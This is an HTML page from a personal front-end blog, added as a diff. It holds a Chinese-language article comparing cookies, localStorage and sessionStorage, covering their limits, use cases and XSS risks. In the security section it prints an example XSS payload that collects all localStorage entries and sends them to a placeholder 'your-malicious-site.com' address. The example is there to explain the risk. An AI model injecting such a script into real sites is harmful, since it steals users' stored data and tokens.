@@ -1,0 +1,580 @@
+<!DOCTYPE html>
+<html >
+<head>
+
+    <!--[if lt IE 9]>
+        <style>body {display: none; background: none !important} </style>
+        <meta http-equiv="Refresh" Content="0; url=//outdatedbrowser.com/" />
+    <![endif]-->
+
+<meta charset="utf-8">
+<meta http-equiv="X-UA-Compatible" content="IE=edge, chrome=1" />
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no">
+<meta name="format-detection" content="telephone=no" />
+<meta name="author" content="qiyian" />
+
+
+
+<meta name="description" content="sessionStorage、localStorage、cookie都是在浏览器端存储的数据HTML5本地存储的前身就是Cookie，HTML5的本地存储是使localStorage对象将WEB数据持久化在本地。其中sessionStorage的概念很特别，引入了一个“浏览器窗口”的概念。sessionStorage是在同源的同窗口（或tab）中，始终存在的数据。也就是说只要这个浏览器窗口没有关闭">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Cookie、localStorage、sessionStorage">
+<meta property="og:url" content="http://yoursite.com/2016/03/30/cookiewebstorage/index.html">
+<meta property="og:site_name" content="qiyian's blog">
+<meta property="og:description" content="sessionStorage、localStorage、cookie都是在浏览器端存储的数据HTML5本地存储的前身就是Cookie，HTML5的本地存储是使localStorage对象将WEB数据持久化在本地。其中sessionStorage的概念很特别，引入了一个“浏览器窗口”的概念。sessionStorage是在同源的同窗口（或tab）中，始终存在的数据。也就是说只要这个浏览器窗口没有关闭">
+<meta property="og:updated_time" content="2016-11-12T12:34:55.000Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="Cookie、localStorage、sessionStorage">
+<meta name="twitter:description" content="sessionStorage、localStorage、cookie都是在浏览器端存储的数据HTML5本地存储的前身就是Cookie，HTML5的本地存储是使localStorage对象将WEB数据持久化在本地。其中sessionStorage的概念很特别，引入了一个“浏览器窗口”的概念。sessionStorage是在同源的同窗口（或tab）中，始终存在的数据。也就是说只要这个浏览器窗口没有关闭">
+
+<link rel="apple-touch-icon" href= "/apple-touch-icon.png">
+
+
+    <link rel="alternate" href="/atom.xml" title="qiyian&#39;s blog" type="application/atom+xml">
+
+
+
+    <link rel="shortcut icon" href="/favicon.png">
+
+
+
+    <link href="//cdn.bootcss.com/animate.css/3.5.1/animate.min.css" rel="stylesheet">
+
+
+
+    <link href="//cdn.bootcss.com/fancybox/2.1.5/jquery.fancybox.min.css" rel="stylesheet">
+
+
+
+    <script src="//cdn.bootcss.com/pace/1.0.2/pace.min.js"></script>
+    <link href="//cdn.bootcss.com/pace/1.0.2/themes/blue/pace-theme-minimal.css" rel="stylesheet">
+
+
+<link rel="stylesheet" href="/css/style.css">
+
+
+
+<link href="//cdn.bootcss.com/font-awesome/4.6.3/css/font-awesome.min.css" rel="stylesheet">
+
+
+<title>Cookie、localStorage、sessionStorage | qiyian&#39;s blog</title>
+
+<script src="//cdn.bootcss.com/jquery/2.2.4/jquery.min.js"></script>
+<script src="//cdn.bootcss.com/clipboard.js/1.5.10/clipboard.min.js"></script>
+
+<script>
+    var yiliaConfig = {
+        fancybox: true,
+        animate: true,
+        isHome: false,
+        isPost: true,
+        isArchive: false,
+        isTag: false,
+        isCategory: false,
+        fancybox_js: "//cdn.bootcss.com/fancybox/2.1.5/jquery.fancybox.min.js",
+        scrollreveal: "//cdn.bootcss.com/scrollReveal.js/3.1.4/scrollreveal.min.js",
+        search: undefined
+    }
+</script>
+
+
+    <script> yiliaConfig.jquery_ui = [false]; </script>
+
+
+
+    <script> yiliaConfig.rootUrl = "\/";</script>
+
+
+
+
+
+
+</head>
+<body>
+  <div id="container">
+    <div class="left-col">
+    <div class="overlay"></div>
+<div class="intrude-less">
+    <header id="header" class="inner">
+        <a href="/" class="profilepic">
+            <img src="/img/avatar.png" class="animated zoomIn">
+        </a>
+        <hgroup>
+          <h1 class="header-author"><a href="/">qiyian</a></h1>
+        </hgroup>
+
+        
+
+        
+
+
+        
+            <div id="switch-btn" class="switch-btn">
+                <div class="icon">
+                    <div class="icon-ctn">
+                        <div class="icon-wrap icon-house" data-idx="0">
+                            <div class="birdhouse"></div>
+                            <div class="birdhouse_holes"></div>
+                        </div>
+                        <div class="icon-wrap icon-ribbon hide" data-idx="1">
+                            <div class="ribbon"></div>
+                        </div>
+                        
+                        <div class="icon-wrap icon-link hide" data-idx="2">
+                            <div class="loopback_l"></div>
+                            <div class="loopback_r"></div>
+                        </div>
+                        
+                        
+                        <div class="icon-wrap icon-me hide" data-idx="3">
+                            <div class="user"></div>
+                            <div class="shoulder"></div>
+                        </div>
+                        
+                    </div>
+                    
+                </div>
+                <div class="tips-box hide">
+                    <div class="tips-arrow"></div>
+                    <ul class="tips-inner">
+                        <li>菜单</li>
+                        <li>标签</li>
+                        
+                        <li>友情链接</li>
+                        
+                        
+                        <li>关于我</li>
+                        
+                    </ul>
+                </div>
+            </div>
+        
+
+        <div id="switch-area" class="switch-area">
+            <div class="switch-wrap">
+                <section class="switch-part switch-part1">
+                    <nav class="header-menu">
+                        <ul>
+                        
+                            <li><a href="/">主页</a></li>
+                        
+                            <li><a href="/archives/">所有文章</a></li>
+                        
+                            <li><a href="/tags/">标签云</a></li>
+                        
+                            <li><a href="/about/">关于我</a></li>
+                        
+                        </ul>
+                    </nav>
+                    <nav class="header-nav">
+                        <ul class="social">
+                            
+                                <a class="fa Email" href="mailto:yqiyian@gmail.com" title="Email"></a>
+                            
+                                <a class="fa 新浪微博" href="http://weibo.com/p/1005053974872114" title="新浪微博"></a>
+                            
+                                <a class="fa GitHub" href="https://github.com/qiyian" title="GitHub"></a>
+                            
+                                <a class="fa 知乎" href="https://www.zhihu.com/people/qi-yi-an-40" title="知乎"></a>
+                            
+                                <a class="fa SegmentFault" href="https://segmentfault.com/u/qiyian" title="SegmentFault"></a>
+                            
+                                <a class="fa 网易云音乐" href="http://music.163.com/#/user/home?id=341738296" title="网易云音乐"></a>
+                            
+                        </ul>
+                    </nav>
+                </section>
+                
+                
+                <section class="switch-part switch-part2">
+                    <div class="widget tagcloud" id="js-tagcloud">
+                        <ul class="tag-list"><li class="tag-list-item"><a class="tag-list-link" href="/tags/canvas入门篇/">canvas入门篇</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/gulp/">gulp</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/yo-vue-vuex-webpack/">yo+vue+vuex+webpack</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/前端工程化/">前端工程化</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/移动端常见错误/">移动端常见错误</a></li></ul>
+                    </div>
+                </section>
+                
+                
+                
+                <section class="switch-part switch-part3">
+                    <div id="js-friends">
+                    
+                      <a class="main-nav-link switch-friends-link" href="https://hexo.io">Hexo</a>
+                    
+                      <a class="main-nav-link switch-friends-link" href="https://pages.github.com/">GitHub</a>
+                    
+                      <a class="main-nav-link switch-friends-link" href="http://moxfive.xyz/">MOxFIVE</a>
+                    
+                    </div>
+                </section>
+                
+
+                
+                
+                <section class="switch-part switch-part4">
+                
+                    <div id="js-aboutme">专注于前端</div>
+                </section>
+                
+            </div>
+        </div>
+    </header>                
+</div>
+    </div>
+    <div class="mid-col">
+      <nav id="mobile-nav">
+      <div class="overlay">
+          <div class="slider-trigger"></div>
+          <h1 class="header-author js-mobile-header hide"><a href="/" title="回到主页">qiyian</a></h1>
+      </div>
+    <div class="intrude-less">
+        <header id="header" class="inner">
+            <a href="/" class="profilepic">
+                <img src="/img/avatar.png" class="animated zoomIn">
+            </a>
+            <hgroup>
+              <h1 class="header-author"><a href="/" title="回到主页">qiyian</a></h1>
+            </hgroup>
+            
+            <nav class="header-menu">
+                <ul>
+                
+                    <li><a href="/">主页</a></li>
+                
+                    <li><a href="/archives/">所有文章</a></li>
+                
+                    <li><a href="/tags/">标签云</a></li>
+                
+                    <li><a href="/about/">关于我</a></li>
+                
+                <div class="clearfix"></div>
+                </ul>
+            </nav>
+            <nav class="header-nav">
+                        <ul class="social">
+                            
+                                <a class="fa Email" target="_blank" href="mailto:yqiyian@gmail.com" title="Email"></a>
+                            
+                                <a class="fa 新浪微博" target="_blank" href="http://weibo.com/p/1005053974872114" title="新浪微博"></a>
+                            
+                                <a class="fa GitHub" target="_blank" href="https://github.com/qiyian" title="GitHub"></a>
+                            
+                                <a class="fa 知乎" target="_blank" href="https://www.zhihu.com/people/qi-yi-an-40" title="知乎"></a>
+                            
+                                <a class="fa SegmentFault" target="_blank" href="https://segmentfault.com/u/qiyian" title="SegmentFault"></a>
+                            
+                                <a class="fa 网易云音乐" target="_blank" href="http://music.163.com/#/user/home?id=341738296" title="网易云音乐"></a>
+                            
+                        </ul>
+            </nav>
+        </header>                
+    </div>
+    <link class="menu-list" tags="标签" friends="友情链接" about="关于我"/>
+</nav>
+      <div class="body-wrap"><article id="post-cookiewebstorage" class="article article-type-post" itemscope itemprop="blogPost">
+  
+    <div class="article-meta">
+      <a href="/2016/03/30/cookiewebstorage/" class="article-date">
+      <time datetime="2016-03-30T10:09:04.000Z" itemprop="datePublished">2016-03-30</time>
+</a>
+
+
+    </div>
+  
+  <div class="article-inner">
+    
+      <input type="hidden" class="isFancy" />
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 class="article-title" itemprop="name">
+      Cookie、localStorage、sessionStorage
+    </h1>
+  
+
+      </header>
+      
+      <div class="article-info article-info-post">
+        
+
+        
+        <div class="clearfix"></div>
+      </div>
+      
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+          
+        <h2 id="sessionStorage、localStorage、cookie都是在浏览器端存储的数据"><a href="#sessionStorage、localStorage、cookie都是在浏览器端存储的数据" class="headerlink" title="sessionStorage、localStorage、cookie都是在浏览器端存储的数据"></a>sessionStorage、localStorage、cookie都是在浏览器端存储的数据</h2><p>HTML5本地存储的前身就是Cookie，HTML5的本地存储是使localStorage对象将WEB数据持久化在本地。其中sessionStorage的概念很特别，引入了一个“浏览器窗口”的概念。sessionStorage是在同源的同窗口（或tab）中，始终存在的数据。也就是说只要这个浏览器窗口没有关闭，即使刷新页面或进入同源另一页面，数据仍然存在。关闭窗口后，sessionStorage即被销毁。</p>
+<h2 id="cookie"><a href="#cookie" class="headerlink" title="cookie"></a>cookie</h2><h3 id="cookie的优点、缺点"><a href="#cookie的优点、缺点" class="headerlink" title="cookie的优点、缺点"></a>cookie的优点、缺点</h3><h4 id="优点【Advantages】"><a href="#优点【Advantages】" class="headerlink" title="优点【Advantages】"></a>优点【Advantages】</h4><blockquote>
+<p>极高的扩展性和可用性</p>
+</blockquote>
+<ol>
+<li>通过良好的编程，控制保存在cookie中的session对象的大小。</li>
+<li>通过加密和安全传输技术【SSL】，减少cookie被破解的可能性。</li>
+<li>只在cookie中存放不敏感数据，即使被盗也不会有重大损失。</li>
+<li><p>控制cookie的生命期，使之不会永远有效。偷盗者很可能拿到一个过期的cookie。</p>
+<h4 id="缺点【Disadvantages】"><a href="#缺点【Disadvantages】" class="headerlink" title="缺点【Disadvantages】"></a>缺点【Disadvantages】</h4></li>
+<li><p>Cookie数量和长度的限制。每个domain最多只能有20条cookie，每个cookie长度不能超过4KB，否则会被截掉。</p>
+</li>
+<li>安全性问题。如果cookie被人拦截了，那人就可以取得所有的session信息。即使加密也与事无补，因为拦截者并不需要知道cookie的意义，他只要原样转发cookie就可以达到目的了。</li>
+<li>有些状态不可能保存在客户端。例如，为了防止重复提交表单，我们需要在服务器端保存一个计数器。如果我们把这个计数器保存在客户端，那么它起不到任何作用。</li>
+</ol>
+<h2 id="浏览器本地存储webstorage"><a href="#浏览器本地存储webstorage" class="headerlink" title="浏览器本地存储webstorage"></a>浏览器本地存储webstorage</h2><p>在较高版本的浏览器中，js提供了sessionStorage和globalStorage。在HTML5中提供了localStorage来取代globalStorage。</p>
+<p>html5中的Web Storage包括了两种存储方式：sessionStorage和localStorage。</p>
+<p>sessionStorage用于本地存储一个会话【session】中的数据，这些数据只有在同一个会话中的页面才能访问并且当会话结束后数据也随之销毁。因此sessionStorage不是一种持久化的本地存储，仅仅是会话级别的存储。</p>
+<p>而localStorage用于持久化的本地存储，除非主动删除数据，否则数据是永远不会过期的。</p>
+<h4 id="Web-Storage带来的好处："><a href="#Web-Storage带来的好处：" class="headerlink" title="Web Storage带来的好处："></a>Web Storage带来的好处：</h4><ul>
+<li>减少网络流量：一旦数据保存在本地后，就可以避免再向服务器请求数据，因此减少不必要的数据请求，减少数据在浏览器和服务器间不必要地来回传递。</li>
+<li>快速显示数据：性能好，从本地读数据比通过网络从服务器获得数据快得多，本地数据可以即时获得。再加上网页本身也可以有缓存，因此整个页面和数据都在本地的话，可以立即显示。</li>
+<li>临时存储：很多时候数据只需要在用户浏览一组页面期间使用，关闭窗口后数据就可以丢弃了，这种情况使用sessionStorage非常方便。</li>
+</ul>
+<h2 id="web-storage和cookie的区别"><a href="#web-storage和cookie的区别" class="headerlink" title="web storage和cookie的区别"></a>web storage和cookie的区别</h2><p>先说一下共同点：都是保存在浏览器端，且同源的。</p>
+<p>Web Storage的概念和cookie相似，区别是它是为了更大容量存储设计的。Cookie的大小是受限的，并且每次你请求一个新的页面的时候Cookie都会被发送过去，这样无形中浪费了带宽，另外cookie还需要指定作用域，不可以跨域调用。</p>
+<p>除此之外，Web Storage拥有setItem,getItem,removeItem,clear等方法，不像cookie需要前端开发者自己封装setCookie，getCookie。</p>
+<p>但是cookie也是不可以或缺的：<strong>cookie的作用</strong>是与服务器进行交互，作为HTTP规范的一部分而存在 ，而Web Storage仅仅是为了在本地“存储”数据而生</p>
+<p>浏览器的支持除了IE７及以下不支持外，其他标准浏览器都完全支持(ie及FF需在web服务器里运行)，值得一提的是IE总是办好事，例如IE7、IE6中的userData其实就是javascript本地存储的解决方案。通过简单的代码封装可以统一到所有的浏览器都支持web storage。</p>
+<p>localStorage和sessionStorage都具有相同的操作方法，例如setItem、getItem和removeItem等。</p>
+<h3 id="为什么选择Web-Storage而不是Cookie？"><a href="#为什么选择Web-Storage而不是Cookie？" class="headerlink" title="为什么选择Web Storage而不是Cookie？"></a>为什么选择Web Storage而不是Cookie？</h3><p>与Cookie相比，Web Storage存在不少的优势，概括为以下几点：</p>
+<ol>
+<li><p>存储空间更大：IE8下每个独立的存储空间为10M，其他浏览器实现略有不同，但都比Cookie要大很多。</p>
+</li>
+<li><p>存储内容不会发送到服务器：当设置了Cookie后，Cookie的内容会随着请求一并发送的服务器，这对于本地存储的数据是一种带宽浪费。而Web Storage中的数据则仅仅是存在本地，不会与服务器发生任何交互。</p>
+</li>
+<li><p>更多丰富易用的接口：Web Storage提供了一套更为丰富的接口，使得数据操作更为简便。</p>
+</li>
+<li><p>独立的存储空间：每个域（包括子域）有独立的存储空间，各个存储空间是完全独立的，因此不会造成数据混乱。</p>
+</li>
+</ol>
+<h2 id="应用场景"><a href="#应用场景" class="headerlink" title="应用场景"></a>应用场景</h2><p>因为考虑到每个 HTTP 请求都会带着 Cookie 的信息，所以 Cookie 当然是能精简就精简啦，比较常用的一个应用场景就是判断用户是否登录。<br>针对登录过的用户，服务器端会在他登录时往 Cookie 中插入一段加密过的唯一辨识单一用户的辨识码，下次只要读取这个值就可以判断当前用户是否登录啦。<br>曾经还使用 Cookie 来保存用户在电商网站的购物车信息，如今有了 localStorage，就可以利用localStorage代替cookie了。<br>而另一方面 localStorage 接替了 Cookie 管理购物车的工作，同时也能胜任其他一些工作。比如Html5游戏通常会产生一些本地数据，localStorage 也是非常适用的。如果遇到一些内容特别多的表单，为了优化用户体验，我们可能要把表单页面拆分成多个子页面，然后按步骤引导用户填写。这时候 sessionStorage 的作用就发挥出来了。</p>
+<h2 id="安全性的考虑"><a href="#安全性的考虑" class="headerlink" title="安全性的考虑"></a>安全性的考虑</h2><p>需要注意的是，不是什么数据都适合放在 Cookie、localStorage 和 sessionStorage 中的。使用它们的时候，<br>需要时刻注意是否有代码存在 XSS 注入的风险。因为只要打开控制台，你就随意修改它们的值，也就是说如果你的网站中有 XSS 的风险，<br>它们就能对你的 localStorage 肆意妄为。所以千万不要用它们存储你系统中的敏感数据。但是cookie可以采取一些策略来预防XSS攻击。 </p>
+<p>那么</p>
+<h2 id="是否可以代替Cookie"><a href="#是否可以代替Cookie" class="headerlink" title="是否可以代替Cookie"></a>是否可以代替Cookie</h2><p>浏览器使用Cookie进行身份验证已经好多年，那现在既然localStorage存储空间那么大，是否可以把身份验证的数据直接移植过来呢。以现在来看，把身份验证数据使用localStorage进行存储还不太成熟。我们知道，通常可以使用XSS漏洞来获取到Cookie，然后用这个Cookie进行身份验证登录。后来为了防止通过XSS获取Cookie数据，浏览器支持了使用HTTPONLY来保护Cookie不被XSS攻击获取到。而localStorage存储没有对XSS攻击有任何的抵御机制。一旦出现XSS漏洞，那么存储在localStorage里的数据就极易被获取到。 </p>
+<p>如果一个网站存在XSS漏洞，那么攻击者注入如下代码，就可以获取使用localStorage存储在本地的所有信息。<br>Js代码</p>
+<pre><code>var i = 0;  
+var str = &quot;&quot;;  
+while (localStorage.key(i) != null)  
+{  
+    var key = localStorage.key(i);   
+    str += key + &quot;: &quot; + localStorage.getItem(key);  
+    i++;  
+}  
+document.location=&quot;http://your-malicious-site.com?stolen=&quot;+ str;  
+</code></pre><p>攻击者也可以简单的使用localStorage.removeItem(key)和localStorage.clear()对存储数据进行清空。  </p>
+<p>####最后推荐几篇文章：<br><a href="http://zccst.iteye.com/blog/2194344" target="_blank" rel="external">http://zccst.iteye.com/blog/2194344</a></p>
+<p><a href="http://mp.weixin.qq.com/s?__biz=MzAwNzgxMjYzMA==&amp;mid=401640151&amp;idx=1&amp;sn=7057582917c3c477c55e7deb74a83e88#rd&amp;utm_source=tuicool&amp;utm_medium=referral" target="_blank" rel="external">http://mp.weixin.qq.com/s?__biz=MzAwNzgxMjYzMA==&amp;amp</a></p>
+<p><a href="http://blog.csdn.net/cwzhsi/article/details/49557879" target="_blank" rel="external">http://blog.csdn.net/cwzhsi/article/details/49557879</a></p>
+<hr>
+
+      
+    </div>
+    
+  </div>
+  
+    
+    <div class="copyright">
+        <p><span>本文标题:</span><a href="/2016/03/30/cookiewebstorage/">Cookie、localStorage、sessionStorage</a></p>
+        <p><span>文章作者:</span><a href="/" title="回到主页">qiyian</a></p>
+        <p><span>发布时间:</span>2016-03-30, 18:09:04</p>
+        <p><span>最后更新:</span>2016-11-12, 20:34:55</p>
+        <p>
+            <span>原始链接:</span><a class="post-url" href="/2016/03/30/cookiewebstorage/" title="Cookie、localStorage、sessionStorage">http://yoursite.com/2016/03/30/cookiewebstorage/</a>
+            <span class="copy-path" data-clipboard-text="原文: http://yoursite.com/2016/03/30/cookiewebstorage/　　作者: qiyian" title="点击复制文章链接"><i class="fa fa-clipboard"></i></span>
+            <script> var clipboard = new Clipboard('.copy-path'); </script>
+        </p>
+        <p>
+            <span>许可协议:</span><i class="fa fa-creative-commons"></i> <a rel="license" href="http://creativecommons.org/licenses/by-nc-sa/4.0/" title="CC BY-NC-SA 4.0 International" target = "_blank">"署名-非商用-相同方式共享 4.0"</a> 转载请保留原文链接及作者。
+        </p>
+    </div>
+
+
+
+    <nav id="article-nav">
+        
+            <div id="article-nav-newer" class="article-nav-title">
+                <a href="/2016/07/12/ECMAScript-6-对象的扩展之this-浅浅谈/">
+                    ECMAScript 6 对象的扩展之this =&gt; 浅谈
+                </a>
+            </div>
+        
+        
+            <div id="article-nav-older" class="article-nav-title">
+                <a href="/2016/01/22/wexinhao/">
+                    微信公众号的区别
+                </a>
+            </div>
+        
+    </nav>
+
+  
+</article>
+
+    <div id="toc" class="toc-article">
+        <strong class="toc-title">文章目录</strong>
+        
+            <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#sessionStorage、localStorage、cookie都是在浏览器端存储的数据"><span class="toc-number">1.</span> <span class="toc-text">sessionStorage、localStorage、cookie都是在浏览器端存储的数据</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#cookie"><span class="toc-number">2.</span> <span class="toc-text">cookie</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#cookie的优点、缺点"><span class="toc-number">2.1.</span> <span class="toc-text">cookie的优点、缺点</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#优点【Advantages】"><span class="toc-number">2.1.1.</span> <span class="toc-text">优点【Advantages】</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#缺点【Disadvantages】"><span class="toc-number">2.1.2.</span> <span class="toc-text">缺点【Disadvantages】</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#浏览器本地存储webstorage"><span class="toc-number">3.</span> <span class="toc-text">浏览器本地存储webstorage</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#Web-Storage带来的好处："><span class="toc-number">3.0.1.</span> <span class="toc-text">Web Storage带来的好处：</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#web-storage和cookie的区别"><span class="toc-number">4.</span> <span class="toc-text">web storage和cookie的区别</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#为什么选择Web-Storage而不是Cookie？"><span class="toc-number">4.1.</span> <span class="toc-text">为什么选择Web Storage而不是Cookie？</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#应用场景"><span class="toc-number">5.</span> <span class="toc-text">应用场景</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#安全性的考虑"><span class="toc-number">6.</span> <span class="toc-text">安全性的考虑</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#是否可以代替Cookie"><span class="toc-number">7.</span> <span class="toc-text">是否可以代替Cookie</span></a></li></ol>
+        
+    </div>
+    <style>
+        .left-col .switch-btn,
+        .left-col .switch-area {
+            display: none;
+        }
+        .toc-level-3 i,
+        .toc-level-3 ol {
+            display: none !important;
+        }
+    </style>
+
+    <input type="button" id="tocButton" value="隐藏目录"  title="点击按钮隐藏或者显示文章目录">
+
+    <script>
+        yiliaConfig.toc = ["隐藏目录", "显示目录", !!"false"];
+    </script>
+
+
+
+    
+<div class="share">
+    
+        <div class="bdsharebuttonbox">
+            <a href="#" class="fa fa-twitter bds_twi" data-cmd="twi" title="分享到推特"></a>
+            <a href="#" class="fa fa-weibo bds_tsina" data-cmd="tsina" title="分享到新浪微博"></a>
+            <a href="#" class="fa fa-qq bds_sqq" data-cmd="sqq" title="分享给 QQ 好友"></a>
+            <a href="#" class="fa fa-files-o bds_copy" data-cmd="copy" title="复制网址"></a>
+            <a href="#" class="fa fa fa-envelope-o bds_mail" data-cmd="mail" title="通过邮件分享"></a>
+            <a href="#" class="fa fa-weixin bds_weixin" data-cmd="weixin" title="生成文章二维码"></a>
+            <a href="#" class="fa fa-share-alt bds_more" data-cmd="more"></i></a>
+        </div>
+        <script>
+            window._bd_share_config={
+                "common":{"bdSnsKey":{},"bdText":"Cookie、localStorage、sessionStorage　| qiyian's blog　","bdMini":"2","bdMiniList":false,"bdPic":"","bdStyle":"0","bdSize":"24"},"share":{}};with(document)0[(getElementsByTagName('head')[0]||body).appendChild(createElement('script')).src='http://bdimg.share.baidu.com/static/api/js/share.js?v=89860593.js?cdnversion='+~(-new Date()/36e5)];
+        </script>
+    
+
+    
+</div>
+
+
+
+
+
+
+
+    
+
+
+
+
+    <div class="scroll" id="post-nav-button">
+        
+            <a href="/2016/07/12/ECMAScript-6-对象的扩展之this-浅浅谈/" title="上一篇: ECMAScript 6 对象的扩展之this =&gt; 浅谈">
+                <i class="fa fa-angle-left"></i>
+            </a>
+        
+
+        <a title="文章列表"><i class="fa fa-bars"></i><i class="fa fa-times"></i></a>
+
+        
+            <a href="/2016/01/22/wexinhao/" title="下一篇: 微信公众号的区别">
+                <i class="fa fa-angle-right"></i>
+            </a>
+        
+    </div>
+
+    <ul class="post-list"><li class="post-list-item"><a class="post-list-link" href="/2017/03/24/kuayu/">浏览器同源与跨域问题总结</a></li><li class="post-list-item"><a class="post-list-link" href="/2016/11/11/vuewebpack/">用Webpack构建Vue</a></li><li class="post-list-item"><a class="post-list-link" href="/2016/09/24/关于前端工程化工具feikit的使用以及小案例/">关于前端工程化工具feikit的使用以及小案例</a></li><li class="post-list-item"><a class="post-list-link" href="/2016/07/15/水平垂直居中/">水平垂直居中的几种方式</a></li><li class="post-list-item"><a class="post-list-link" href="/2016/07/12/ECMAScript-6-对象的扩展之this-浅浅谈/">ECMAScript 6 对象的扩展之this => 浅谈</a></li><li class="post-list-item"><a class="post-list-link" href="/2016/03/30/cookiewebstorage/">Cookie、localStorage、sessionStorage</a></li><li class="post-list-item"><a class="post-list-link" href="/2016/01/22/wexinhao/">微信公众号的区别</a></li><li class="post-list-item"><a class="post-list-link" href="/2015/11/19/vue常用/">vue</a></li><li class="post-list-item"><a class="post-list-link" href="/2015/06/22/gulp实现前端工程化/">gulp实现前端工程化</a></li><li class="post-list-item"><a class="post-list-link" href="/2015/01/10/移动端小问题/">移动端常见错误</a></li><li class="post-list-item"><a class="post-list-link" href="/2014/12/27/clearfloat/">用Clear与BFC清除浮动</a></li><li class="post-list-item"><a class="post-list-link" href="/2014/12/23/BFC/">到底什么是BFC</a></li><li class="post-list-item"><a class="post-list-link" href="/2014/12/18/git/">Git与SVN的区别</a></li><li class="post-list-item"><a class="post-list-link" href="/2014/12/09/canvas/">canvas入门详解</a></li><li class="post-list-item"><a class="post-list-link" href="/2014/10/16/html5/">html5总结之一（综述）</a></li><li class="post-list-item"><a class="post-list-link" href="/2014/06/02/this/">JavaScript 中的 this</a></li><li class="post-list-item"><a class="post-list-link" href="/2014/05/28/callapply/">js中call与apply的用法</a></li><li class="post-list-item"><a class="post-list-link" href="/2014/05/09/json/">JSON及JS对JSON的操作</a></li></ul>
+
+
+
+
+    <script>
+        
+    </script>
+</div>
+      <footer id="footer">
+    <div class="outer">
+        <div id="footer-info">
+            <div class="footer-left">
+                <i class="fa fa-copyright"></i> 
+                2016-2017 qiyian
+            </div>
+            <div class="footer-right">
+                <a href="http://hexo.io/" target="_blank" title="快速、简洁且高效的博客框架">Hexo</a>  Theme <a href="https://github.com/MOxFIVE/hexo-theme-yelee" target="_blank" title="简而不减 Hexo 双栏博客主题  v3.5">Yelee</a> by MOxFIVE <i class="fa fa-heart animated infinite pulse"></i>
+            </div>
+        </div>
+        
+            <div class="visit">
+                
+                    <span id="busuanzi_container_site_pv" style='display:none'>
+                        <span id="site-visit" title="本站到访数"><i class="fa fa-user" aria-hidden="true"></i><span id="busuanzi_value_site_uv"></span>
+                        </span>
+                    </span>
+                
+                
+                    <span>| </span>
+                
+                
+                    <span id="busuanzi_container_page_pv" style='display:none'>
+                        <span id="page-visit"  title="本页阅读量"><i class="fa fa-eye animated infinite pulse" aria-hidden="true"></i><span id="busuanzi_value_page_pv"></span>
+                        </span>
+                    </span>
+                
+            </div>
+        
+    </div>
+</footer>
+    </div>
+    
+<script data-main="/js/main.js" src="//cdn.bootcss.com/require.js/2.2.0/require.min.js"></script>
+
+    <script>
+        $(document).ready(function() {
+            var iPad = window.navigator.userAgent.indexOf('iPad');
+            if (iPad > -1 || $(".left-col").css("display") === "none") {
+                var bgColorList = ["#9db3f4", "#414141", "#e5a859", "#f5dfc6", "#c084a0", "#847e72", "#cd8390", "#996731"];
+                var bgColor = Math.ceil(Math.random() * (bgColorList.length - 1));
+                $("body").css({"background-color": bgColorList[bgColor], "background-size": "cover"});
+            }
+            else {
+                var backgroundnum = 5;
+                var backgroundimg = "url(/background/bg-x.jpg)".replace(/x/gi, Math.ceil(Math.random() * backgroundnum));
+                $("body").css({"background": backgroundimg, "background-attachment": "fixed", "background-size": "cover"});
+            }
+        })
+    </script>
+
+
+
+
+
+<div class="scroll" id="scroll">
+    <a href="#" title="返回顶部"><i class="fa fa-arrow-up"></i></a>
+    <a href="#comments" onclick="load$hide();" title="查看评论"><i class="fa fa-comments-o"></i></a>
+    <a href="#footer" title="转到底部"><i class="fa fa-arrow-down"></i></a>
+</div>
+<script>
+    // Open in New Window
+    
+        var oOpenInNew = {
+            
+            
+            
+            
+            
+            
+             archives: ".archive-article-title", 
+             miniArchives: "a.post-list-link", 
+            
+             friends: "#js-friends a", 
+             socail: ".social a" 
+        }
+        for (var x in oOpenInNew) {
+            $(oOpenInNew[x]).attr("target", "_blank");
+        }
+    
+</script>
+
+<script async src="https://dn-lbstatics.qbox.me/busuanzi/2.3/busuanzi.pure.mini.js">
+</script>
+  </div>
+</body>
+</html>
